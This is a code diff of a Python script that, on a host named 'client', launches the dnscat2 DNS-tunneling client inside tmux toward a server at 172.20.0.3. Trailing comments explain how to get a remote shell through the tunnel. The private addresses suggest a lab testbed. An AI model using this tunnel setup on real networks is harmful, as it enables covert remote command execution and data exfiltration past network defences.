@@ -1,23 +1,42 @@
 import subprocess
 import os 
 import time
+import socket
 
-os.chdir("/home/ssh_user/dns/client")
-# get ip address from server and run it in the server?
+hostname = socket.gethostname()
+print("Hostname:", hostname)
 
-session_name = "dns_session_client"
-# Start a new tmux session
-subprocess.run(f"tmux new-session -d -s {session_name}", shell=True)
-time.sleep(1)  # Wait for tmux session to initialize
+if hostname == 'client':
 
-# Send the command to start dnscat2
-cmd = 'sleep 10'
-subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)
+    os.chdir("/dns/client")
+    # get ip address from server and run it in the server?
 
-cmd = "./dnscat --dns server=172.20.0.3,port=53 --secret=abc"
-subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)
+    session_name = "dns_session_client"
+    # Start a new tmux session
+    subprocess.run(f"tmux new-session -d -s {session_name}", shell=True)
+    time.sleep(1)  # Wait for tmux session to initialize
 
-# time.sleep(15)
+    # Send the command to start dnscat2
+    cmd = 'sleep 10'
+    subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)
 
-# Attach to the tmux session
-subprocess.run(f"tmux attach -t {session_name}", shell=True)
+    cmd = "./dnscat --dns server=172.20.0.3,port=53 --secret=abc"
+    subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)
+
+    # time.sleep(15)
+
+    # Attach to the tmux session
+    subprocess.run(f"tmux attach -t {session_name}", shell=True)
+
+# commands:
+# dns tunneling: initiate client & server listner in tmux session
+# dns server first: 
+# ruby dnscat2.rb --secret=abc
+# enter session server: session -i 1
+# shell
+# session -i 2
+#  NOW ANY COMMANDS CAN BE RUN - (except possibly ssh- no psudo terminal)
+# ping 172.20.0.2
+
+# dns client command:  
+# ./dnscat --dns server=172.20.0.3,port=53 --secret=abc
